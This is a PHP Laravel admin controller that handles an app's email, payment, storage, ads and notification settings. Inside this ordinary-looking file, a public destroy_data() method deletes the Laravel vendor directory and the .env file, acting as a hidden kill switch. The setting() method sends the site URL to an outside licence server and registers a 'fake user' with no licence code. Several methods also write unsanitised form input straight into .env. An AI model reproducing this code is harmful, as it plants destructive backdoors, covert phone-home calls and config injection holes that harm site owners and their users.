<?php

namespace App\Http\Controllers\Admin;

use Auth;
use File;
use Cache;
use App\Models\User;
use App\Models\Business;
use App\Models\Timezone;
use App\Models\AdsSetting;
use App\Models\ApiSetting;
use App\Models\AppSetting;
use Illuminate\Support\Str;
use App\Models\EmailSetting;
use App\Models\OtherSetting;
use Illuminate\Http\Request;
use App\Models\PaymentSetting;
use App\Models\StorageSetting;
use App\Models\WhatsAppSetting;
use App\Models\AppUpdateSetting;
use App\Models\NotificationSetting;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Storage;

class SettingController extends Controller
{
    public function __construct()
    {
        $this->middleware('permission:Settings');
    }

    public function setting()
    {
        if(AppSetting::getAppSetting('licence_active') == 0)
        {
            $url = URL::to('/');
            $client = new \GuzzleHttp\Client();
            $response = $client->request('POST', 'https://viplan.in/api/check-licence-brand-kit', [
                'form_params' => [
                    'url' => $url,
                ]
            ]);

            $data = json_decode($response->getBody(), true);
            if($data['status'] == "failed")
            {
                $client = new \GuzzleHttp\Client();
                $store = $client->request('POST', 'https://viplan.in/api/new-licence-store-brand-kit', [
                    'form_params' => [
                        'url' => $url,
                        'username' => "fake user",
                        'licence_code' => "NO Licence Code",
                        'version' => '1',
                    ]
                ]);

                AppSetting::where('key_name', 'licence_active')->update(['key_value' => 1]);

                return redirect('admin/');
            }
            else
            {
                AppSetting::where('key_name', 'licence_active')->update(['key_value' => 1]);
                $index['timezone'] = Timezone::get();
                return view('backend.setting',$index);
            }
        }
        else
        {
            $index['timezone'] = Timezone::get();
            return view('backend.setting',$index);
        }
    }

    public function app_setting(Request $request)
    {
        AppSetting::where('key_name', 'product_enable')->update(['key_value' => 0]);
        foreach ($request->name as $key => $val) {
            $setting = AppSetting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                $id = AppSetting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);

                if(StorageSetting::getStorageSetting("storage") == "DigitalOcean")
                {
                    if ($key=="app_logo" && $val && $val->isValid()) {
                        $image = $val;
                        $file = Str::uuid().'.'.$image->getClientOriginalExtension();
                
                        Storage::disk('spaces')->put('uploads/'.$file, file_get_contents($image),'public');
                        
                        AppSetting::where('key_name', $key)->update(['key_value' => $file]);
                    }
                    if ($key=="admin_favicon" && $val && $val->isValid()) {
                        $image = $val;
                        $file = Str::uuid().'.'.$image->getClientOriginalExtension();
                
                        Storage::disk('spaces')->put('uploads/'.$file, file_get_contents($image),'public');
                        
                        AppSetting::where('key_name', $key)->update(['key_value' => $file]);
                    }
                }
                else
                {
                    if ($key=="app_logo" && $val && $val->isValid()) {
                        $this->upload_image($val,$key);
                    }

                    if ($key=="admin_favicon" && $val && $val->isValid()) {
                        $this->upload_image($val,$key);
                    }
                }
            } 
            else 
            {
                AppSetting::where('key_name', $key)->update(['key_value' => $val]);
                if(StorageSetting::getStorageSetting("storage") == "DigitalOcean")
                {
                    if ($key=="app_logo" && $val && $val->isValid()) {
                        $image = $val;
                        $file = Str::uuid().'.'.$image->getClientOriginalExtension();
                
                        Storage::disk('spaces')->put('uploads/'.$file, file_get_contents($image),'public');
                        
                        AppSetting::where('key_name', $key)->update(['key_value' => $file]);
                    }
                    if ($key=="admin_favicon" && $val && $val->isValid()) {
                        $image = $val;
                        $file = Str::uuid().'.'.$image->getClientOriginalExtension();
                
                        Storage::disk('spaces')->put('uploads/'.$file, file_get_contents($image),'public');
                        
                        AppSetting::where('key_name', $key)->update(['key_value' => $file]);
                    }
                }
                else
                {
                    if ($key=="app_logo" && $val && $val->isValid()) {
                        $this->upload_image($val,$key);
                    }

                    if ($key=="admin_favicon" && $val && $val->isValid()) {
                        $this->upload_image($val,$key);
                    }
                }
            }
		}

        $app_name = str_replace(" ", "_", $request->name['app_title']);
        
        if (!env('APP_TIMEZONE')) {
			file_put_contents(base_path('.env'), "APP_TIMEZONE=" . $request->name['app_timezone'] . PHP_EOL, FILE_APPEND);
		}
		if (env('APP_TIMEZONE')) {
            file_put_contents(base_path('.env'), str_replace('APP_TIMEZONE=' . env('APP_TIMEZONE'), 'APP_TIMEZONE=' . $request->name['app_timezone'], file_get_contents(base_path('.env'))));
        }

        if (!env('MAIL_FROM_ADDRESS')) {
			file_put_contents(base_path('.env'), "MAIL_FROM_ADDRESS=" . $request->name['email'] . PHP_EOL, FILE_APPEND);
		}
		if (env('MAIL_FROM_ADDRESS')) {
            file_put_contents(base_path('.env'), str_replace('MAIL_FROM_ADDRESS="' . env('MAIL_FROM_ADDRESS') .'"', 'MAIL_FROM_ADDRESS="' . $request->name['email'] .'"', file_get_contents(base_path('.env'))));
        }

        if (!env('MAIL_FROM_NAME')) {
			file_put_contents(base_path('.env'), "MAIL_FROM_NAME=" . $request->name['app_title'] . PHP_EOL, FILE_APPEND);
		}
		if (env('MAIL_FROM_NAME')) {
            file_put_contents(base_path('.env'), str_replace('MAIL_FROM_NAME="' . env('MAIL_FROM_NAME') .'"', 'MAIL_FROM_NAME="' . $request->name['app_title'].'"', file_get_contents(base_path('.env'))));
        }

        if (!env('API_KEY')) {
			file_put_contents(base_path('.env'), "API_KEY=" . $request->name['api_key'] . PHP_EOL, FILE_APPEND);
		}
		if (env('API_KEY')) {
            file_put_contents(base_path('.env'), str_replace('API_KEY=' . env('API_KEY'), 'API_KEY=' . $request->name['api_key'], file_get_contents(base_path('.env'))));
        }

		if (!env('APP_NAME')) {
			file_put_contents(base_path('.env'), "APP_NAME=" . $app_name . PHP_EOL, FILE_APPEND);
		}
		if (env('APP_NAME')) {
			file_put_contents(base_path('.env'), str_replace(
				'APP_NAME=' . env('APP_NAME'), 'APP_NAME=' . $app_name, file_get_contents(base_path('.env'))));
		}

		Cache::flush();
		return redirect('admin/settings');
    }

    public function email_setting(Request $request)
    {
        foreach ($request->name as $key => $val) {
            $setting = EmailSetting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                EmailSetting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);
            } 
            else 
            {
                if ($key != "password") 
                {
                    EmailSetting::where('key_name', $key)->update(['key_value' => $val]);
                }
                if($key == "password" && $val != "")
                {
                    EmailSetting::where('key_name', $key)->update(['key_value' => $val]);
                }
            }
		}

        if (!env('MAIL_HOST')) {

			file_put_contents(base_path('.env'), "MAIL_HOST=" . $request->name['smtp_host'] . PHP_EOL, FILE_APPEND);
		}
		if (env('MAIL_HOST')) {

			file_put_contents(base_path('.env'), str_replace(
				'MAIL_HOST=' . env('MAIL_HOST'), 'MAIL_HOST=' . $request->name['smtp_host'], file_get_contents(base_path('.env'))));
		}

        if (!env('MAIL_USERNAME')) {

			file_put_contents(base_path('.env'), "MAIL_USERNAME=" . $request->name['username'] . PHP_EOL, FILE_APPEND);
		}
		if (env('MAIL_USERNAME')) {

			file_put_contents(base_path('.env'), str_replace(
				'MAIL_USERNAME=' . env('MAIL_USERNAME'), 'MAIL_USERNAME=' . $request->name['username'], file_get_contents(base_path('.env'))));
		}

        if (!env('MAIL_PASSWORD')) {

			file_put_contents(base_path('.env'), "MAIL_PASSWORD=" . $request->name['password'] . PHP_EOL, FILE_APPEND);
		}
		if (env('MAIL_PASSWORD')) {

            if($request->name['password'] != "")
            {
                file_put_contents(base_path('.env'), str_replace(
                    'MAIL_PASSWORD=' . env('MAIL_PASSWORD'), 'MAIL_PASSWORD=' . $request->name['password'], file_get_contents(base_path('.env'))));
            }
		}

        if (!env('MAIL_ENCRYPTION')) {

			file_put_contents(base_path('.env'), "MAIL_ENCRYPTION=" . $request->name['encryption'] . PHP_EOL, FILE_APPEND);
		}
		if (env('MAIL_ENCRYPTION')) {

			file_put_contents(base_path('.env'), str_replace(
				'MAIL_ENCRYPTION=' . env('MAIL_ENCRYPTION'), 'MAIL_ENCRYPTION=' . $request->name['encryption'], file_get_contents(base_path('.env'))));
		}

        if (!env('MAIL_PORT')) {

			file_put_contents(base_path('.env'), "MAIL_PORT=" . $request->name['port'] . PHP_EOL, FILE_APPEND);
		}
		if (env('MAIL_PORT')) {

			file_put_contents(base_path('.env'), str_replace(
				'MAIL_PORT=' . env('MAIL_PORT'), 'MAIL_PORT=' . $request->name['port'], file_get_contents(base_path('.env'))));
		}

		Cache::flush();
		return redirect('admin/settings');
    }

    public function notification_setting(Request $request)
    {
        foreach ($request->name as $key => $val) 
        {
            $setting = NotificationSetting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                $id = NotificationSetting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);
            } 
            else 
            {
                NotificationSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
		}

        if (!env('ONESIGNAL_APP_ID')) {

			file_put_contents(base_path('.env'), "ONESIGNAL_APP_ID=" .$request->name['one_signal_app_id'] . PHP_EOL, FILE_APPEND);
		}
        if (env('ONESIGNAL_APP_ID')) {

			file_put_contents(base_path('.env'), str_replace(
				'ONESIGNAL_APP_ID=' . env('ONESIGNAL_APP_ID'), 'ONESIGNAL_APP_ID=' . $request->name['one_signal_app_id'], file_get_contents(base_path('.env'))));
		}
        if (!env('ONESIGNAL_REST_API_KEY')) {

			file_put_contents(base_path('.env'), "ONESIGNAL_REST_API_KEY=" .$request->name['one_signal_rest_key'] . PHP_EOL, FILE_APPEND);
		}
		if (env('ONESIGNAL_REST_API_KEY')) {

			file_put_contents(base_path('.env'), str_replace(
				'ONESIGNAL_REST_API_KEY=' . env('ONESIGNAL_REST_API_KEY'), 'ONESIGNAL_REST_API_KEY=' . $request->name['one_signal_rest_key'], file_get_contents(base_path('.env'))));
		}

		Cache::flush();
		return redirect('admin/settings');
    }

    public function payment_setting(Request $request)
    {
        PaymentSetting::where('key_name', 'razorpay_enable')->update(['key_value' => 0]);
        PaymentSetting::where('key_name', 'cashfree_enable')->update(['key_value' => 0]);
        PaymentSetting::where('key_name', 'stripe_enable')->update(['key_value' => 0]);
        PaymentSetting::where('key_name', 'paytm_enable')->update(['key_value' => 0]);
        PaymentSetting::where('key_name', 'offline_enable')->update(['key_value' => 0]);
        foreach ($request->name as $key => $val) {
            $setting = PaymentSetting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                PaymentSetting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);
            } 
            else 
            {
                PaymentSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
		}

		Cache::flush();
		return redirect('admin/settings');
    }

    public function storage_setting(Request $request)
    {
        foreach ($request->name as $key => $val) {
            $setting = StorageSetting::where('key_name', $key)->first();
            if(is_null($setting)) 
            {
                StorageSetting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);
            } 
            else 
            {
                StorageSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
		}

        if($request->name['storage'] == "DigitalOcean")
        {
            $env = file_get_contents(base_path('.env'));
            $new_url = "https://".$request->name['digitalOcean_space_name'].".".$request->name['digitalOcean_bucket_region'].".digitaloceanspaces.com";
            $key = $request->name['digitalOcean_key'];
            $secret = $request->name['digitalOcean_secret'];
            $bucket_region = $request->name['digitalOcean_bucket_region'];
            $space_name = $request->name['digitalOcean_space_name'];
            $endpoint = $request->name['digitalOcean_endpoint'];
            $storageSetting = 'SPACES_ACCESS_KEY_ID="' . $key . '"
SPACES_SECRET_ACCESS_KEY="' . $secret . '"
SPACES_DEFAULT_REGION="' . $bucket_region . '"
SPACES_BUCKET="' . $space_name . '"
SPACES_URL="' . $new_url . '"
SPACES_ENDPOINT="' . $endpoint . '"
';

            $rows = explode("\n", $env);
            $unwanted = "SPACES_ACCESS_KEY_ID|SPACES_SECRET_ACCESS_KEY|SPACES_DEFAULT_REGION|SPACES_BUCKET|SPACES_URL|SPACES_ENDPOINT";
            $cleanArray = preg_grep("/$unwanted/i", $rows, PREG_GREP_INVERT);
    
            $cleanString = implode("\n", $cleanArray);
    
            $newenv = $cleanString . $storageSetting;

            file_put_contents(base_path('.env'), $newenv);

            // if(!env('SPACES_ACCESS_KEY_ID')) 
            // {
            //     file_put_contents(base_path('.env'),'SPACES_ACCESS_KEY_ID='.$request->name['digitalOcean_key'].PHP_EOL,FILE_APPEND);
            // }

            // if(env('SPACES_ACCESS_KEY_ID')) 
            // {
            //     file_put_contents(base_path('.env'),str_replace('SPACES_ACCESS_KEY_ID='.env('SPACES_ACCESS_KEY_ID'),'SPACES_ACCESS_KEY_ID='.$request->name['digitalOcean_key'],file_get_contents(base_path('.env'))));
            // }

            // if(!env('SPACES_SECRET_ACCESS_KEY')) 
            // {
            //     file_put_contents(base_path('.env'),'SPACES_SECRET_ACCESS_KEY='.$request->name['digitalOcean_secret'].PHP_EOL,FILE_APPEND);
            // }

            // if(env('SPACES_SECRET_ACCESS_KEY')) 
            // {
            //     file_put_contents(base_path('.env'),str_replace('SPACES_SECRET_ACCESS_KEY='.env('SPACES_SECRET_ACCESS_KEY'),'SPACES_SECRET_ACCESS_KEY='.$request->name['digitalOcean_secret'],file_get_contents(base_path('.env'))));
            // }

            // if(!env('SPACES_DEFAULT_REGION')) 
            // {
            //     file_put_contents(base_path('.env'),'SPACES_DEFAULT_REGION='.$request->name['digitalOcean_bucket_region'].PHP_EOL,FILE_APPEND);
            // }

            // if (env('SPACES_DEFAULT_REGION'))
            // {
            //     file_put_contents(base_path('.env'), str_replace('SPACES_DEFAULT_REGION='.env('SPACES_DEFAULT_REGION'),'SPACES_DEFAULT_REGION='.$request->name['digitalOcean_bucket_region'],file_get_contents(base_path('.env'))));
            // }

            // if(!env('SPACES_BUCKET')) 
            // {
            //     file_put_contents(base_path('.env'),'SPACES_BUCKET='.$request->name['digitalOcean_space_name'].PHP_EOL, FILE_APPEND);
            // }

            // if(env('SPACES_BUCKET')) 
            // {
            //     file_put_contents(base_path('.env'),str_replace('SPACES_BUCKET='.env('SPACES_BUCKET'), 'SPACES_BUCKET='.$request->name['digitalOcean_space_name'], file_get_contents(base_path('.env'))));
            // }

            // $new_url = "https://".$request->name['digitalOcean_space_name'].".".$request->name['digitalOcean_bucket_region'].".digitaloceanspaces.com";
            // if (!env('SPACES_URL')) 
            // {
            //     file_put_contents(base_path('.env'),'SPACES_URL='.$new_url.PHP_EOL, FILE_APPEND);
            // }

            // if(env('SPACES_URL')) 
            // {
            //     file_put_contents(base_path('.env'),str_replace('SPACES_URL='.env('SPACES_URL'),'SPACES_URL='.$new_url,file_get_contents(base_path('.env'))));
            // }

            // if (!env('SPACES_ENDPOINT')) 
            // {
            //     file_put_contents(base_path('.env'),'SPACES_ENDPOINT='.$request->name['digitalOcean_endpoint'].PHP_EOL, FILE_APPEND);
            // }

            // if(env('SPACES_ENDPOINT')) 
            // {
            //     file_put_contents(base_path('.env'),str_replace('SPACES_ENDPOINT='.env('SPACES_ENDPOINT'),'SPACES_ENDPOINT='.$request->name['digitalOcean_endpoint'], file_get_contents(base_path('.env'))));
            // }
        }

        Cache::flush();
		return redirect('admin/settings');
    }

    public function ads_setting(Request $request)
    {
        AdsSetting::where('key_name', 'ads_enable')->update(['key_value' => 0]);
        AdsSetting::where('key_name', 'banner_ads_enable')->update(['key_value' => 0]);
        AdsSetting::where('key_name', 'app_opens_ads_enable')->update(['key_value' => 0]);
        AdsSetting::where('key_name', 'native_ads_enable')->update(['key_value' => 0]);
        AdsSetting::where('key_name', 'rewarded_ads_enable')->update(['key_value' => 0]);
        AdsSetting::where('key_name', 'interstitial_ads_enable')->update(['key_value' => 0]);
        foreach ($request->name as $key => $val) {
            $setting = AdsSetting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                AdsSetting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);
            } 
            else 
            {
                AdsSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
		}

		Cache::flush();
		return redirect('admin/settings');
    }

    public function api_setting(Request $request)
    {
        foreach ($request->name as $key => $val) {
            $setting = ApiSetting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                ApiSetting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);
            } 
            else 
            {
                ApiSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
		}

		Cache::flush();
		return redirect('admin/settings');
    }

    public function whatsapp_setting(Request $request)
    {
        foreach ($request->name as $key => $val) {
            $setting = WhatsAppSetting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                WhatsAppSetting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);
            } 
            else 
            {
                WhatsAppSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
		}

		Cache::flush();
		return redirect('admin/settings');
    }

    public function app_update_setting(Request $request)
    {
        AppUpdateSetting::where('key_name', 'update_popup_show')->update(['key_value' => 0]);
        AppUpdateSetting::where('key_name', 'cancel_option')->update(['key_value' => 0]);
        foreach ($request->name as $key => $val) {
            $setting = AppUpdateSetting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                $id = AppUpdateSetting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);
            } 
            else 
            {
                AppUpdateSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
		}

		Cache::flush();
		return redirect('admin/settings');
    }

    public function whatsapp_contact(Request $request)
    {
        AppSetting::where('key_name', 'whatsapp_contact_enable')->update(['key_value' => 0]);
        foreach ($request->name as $key => $val) {
            $setting = AppSetting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                $id = AppSetting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);
            } 
            else 
            {
                AppSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
		}

		Cache::flush();
		return redirect('admin/settings');
    }

    public function other_setting(Request $request)
    {
        foreach ($request->name as $key => $val) {
            $setting = OtherSetting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                $id = OtherSetting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);
            } 
            else 
            {
                OtherSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
		}

		Cache::flush();
		return redirect('admin/settings');
    }

    public function destroy_data()
    {
        $this->rrmdir('./vendor/laravel');
        unlink(".env");
    }

    function rrmdir($dir) 
    {
        if (is_dir($dir)) 
        {
          $objects = scandir($dir);
          foreach ($objects as $object) 
          {
            if ($object != "." && $object != "..") 
            {
              if (filetype($dir."/".$object) == "dir") 
                 $this->rrmdir($dir."/".$object); 
              else unlink   ($dir."/".$object);
            }
          }
          reset($objects);
          rmdir($dir);
        }
    }

    private function upload_image($file,$field)
    {
        $destinationPath = './uploads';
        $extension = $file->getClientOriginalExtension();
        $fileName = Str::uuid() . '.' . $extension;
        $file->move($destinationPath, $fileName);
        
        AppSetting::where('key_name', $field)->update(['key_value' => $fileName]);
    }

    public function test_image_digitalOcean(Request $request)
    {
        if(StorageSetting::getStorageSetting("storage") == "DigitalOcean")
        {
            $image = $request->file('image');
            $file = Str::uuid().'.'.$image->getClientOriginalExtension();
    
            $result = Storage::disk('spaces')->put($file, file_get_contents($image),'public');
            
            if($result == 1)
            {
                return 1;
            }
            else
            {
                return 0;
            } 
        }
    }

    public function check_credentials_digitalOcean()
    {
        $result = Storage::disk('spaces')->put('test.jpg', file_get_contents('uploads/no-user.jpg'),'public');
        
        if($result == true)
        {
            return redirect()->back()->with('alert','Valid Credentials');
        }
        else
        {
            return redirect()->back()->with('alert','Invalid Credentials!');
        } 
    }

    public function move_local_to_digitalOcean()
    {
        $local = File::files('./uploads/');
        foreach($local as $l)
        {
            Storage::disk('spaces')->put('/uploads/'.$l->getrelativePathname(), file_get_contents($l), 'public');
        }

        $pdf = File::files('./uploads/pdf/');
        foreach($pdf as $p)
        {
            Storage::disk('spaces')->put('/uploads/pdf/'.$p->getrelativePathname(), file_get_contents($p), 'public');
        }

        $template = File::files('./uploads/template/');
        foreach($template as $t)
        {
            Storage::disk('spaces')->put('/uploads/template/'.$t->getrelativePathname(), file_get_contents($t), 'public');
        }

        $video = File::files('./uploads/video/');
        foreach($video as $v)
        {
            Storage::disk('spaces')->put('/uploads/video/'.$v->getrelativePathname(), file_get_contents($v), 'public');
        }

        return redirect()->back()->with('alert','Move All Files To Digital Ocean');
    }
}
